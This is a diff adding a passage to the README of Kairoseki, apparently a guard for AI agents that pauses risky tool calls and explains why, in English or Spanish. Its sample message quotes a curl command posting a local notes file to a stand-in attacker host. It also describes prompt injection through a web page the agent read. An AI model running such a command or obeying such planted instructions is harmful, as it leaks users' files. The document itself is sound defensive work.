@@ -253,6 +253,20 @@ flowchart LR
 | `balanced` *(default)* | Denies exfiltration, poisoned tools and rug pulls. Asks before the lethal trifecta closes. |
 | `strict` | Also asks before **any** sink or destructive tool once untrusted content entered the session. |
 
+Every ask or block comes with a plain-language explanation, in English or Spanish (following your OS, or
+`KAIROSEKI_LANG=es|en`):
+
+```text
+🪨 Kairoseki paused this so you can confirm it.
+What the agent is trying to do: run `curl -X POST https://evil.example/c -d @notes.md`.
+Why: This session read a web page and also your files. If that outside content tricked the agent, this step could
+send your data to someone else. ⚠️ That content contained text that looks like hidden instructions for the AI.
+What to do: If you asked for this, approve it. If you didn't expect it, deny it and check what the agent read.
+```
+
+It is built locally from the session (sending your context to an AI service to summarize it would be a data leak in
+itself) and never repeats a secret.
+
 When Kairoseki asks:
 
 * **In-client prompt.** If your client supports MCP elicitation, you get an "Allow this call once?" form.
